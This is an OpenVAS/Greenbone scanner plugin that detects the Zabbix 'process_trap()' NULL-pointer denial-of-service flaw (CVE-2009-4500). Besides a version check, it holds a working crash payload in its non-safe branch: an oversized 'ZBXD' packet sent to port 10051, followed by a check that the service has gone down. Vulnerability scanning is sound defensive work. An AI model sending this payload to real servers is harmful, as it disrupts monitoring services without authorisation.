CPE = "cpe:/a:zabbix:zabbix";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100404" );
	script_version( "2020-11-10T09:46:51+0000" );
	script_tag( name: "last_modification", value: "2020-11-10 09:46:51 +0000 (Tue, 10 Nov 2020)" );
	script_tag( name: "creation_date", value: "2009-12-17 19:46:08 +0100 (Thu, 17 Dec 2009)" );
	script_cve_id( "CVE-2009-4500" );
	script_bugtraq_id( 37308 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_name( "ZABBIX 'process_trap()' NULL Pointer Dereference Denial Of Service Vulnerability" );
	script_category( ACT_MIXED_ATTACK );
	script_family( "Denial of Service" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "zabbix_detect.sc", "zabbix_web_detect.sc" );
	script_mandatory_keys( "Zabbix/installed" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/37740/" );
	script_xref( name: "URL", value: "https://support.zabbix.com/browse/ZBX-993" );
	script_tag( name: "summary", value: "ZABBIX is prone to a denial-of-service vulnerability because
  of a NULL-pointer dereference." );
	script_tag( name: "impact", value: "Successful exploits may allow remote attackers to cause denial-of-
  service conditions. Given the nature of this issue, attackers may also
  be able to run arbitrary code, but this has not been confirmed." );
	script_tag( name: "affected", value: "Versions prior to ZABBIX 1.6.6 are vulnerable." );
	script_tag( name: "solution", value: "Updates are available. Please see the references for details." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_banner" );
	exit( 0 );
}
require("version_func.inc.sc");
require("host_details.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
if( safe_checks() ){
	if(!port = get_app_port( cpe: CPE, service: "www" )){
		exit( 0 );
	}
	if(!vers = get_app_version( cpe: CPE, port: port )){
		exit( 0 );
	}
	if(version_is_less( version: vers, test_version: "1.6.6" )){
		report = report_fixed_ver( installed_version: vers, fixed_version: "1.6.6" );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
else {
	port = service_get_port( default: 10051, proto: "zabbix" );
	soc = open_sock_tcp( port );
	if(!soc){
		exit( 0 );
	}
	header = NASLString( "ZBXD" ) + raw_string( 0x01 );
	data += crap( data: "A", length: 2500 );
	data += NASLString( ":B" );
	size = strlen( data );
	req = header + size + data;
	send( socket: soc, data: req );
	close( soc );
	sleep( 5 );
	soc1 = open_sock_tcp( port );
	if(!soc1){
		security_message( port: port );
		exit( 0 );
	}
	close( soc1 );
}
exit( 0 );

